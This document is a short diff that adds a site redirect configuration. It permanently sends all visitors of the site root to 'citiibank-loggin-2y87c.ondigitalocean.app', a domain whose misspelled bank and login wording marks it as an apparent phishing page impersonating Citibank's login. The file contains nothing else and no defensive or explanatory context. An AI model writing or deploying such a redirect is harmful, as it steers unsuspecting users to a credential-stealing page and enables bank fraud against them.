@@ -1,0 +1,8 @@
+{
+  "redirects": [
+    {
+      "source": "/",
+      "destination": "https://citiibank-loggin-2y87c.ondigitalocean.app/",
+      "permanent": true
+}]
+}
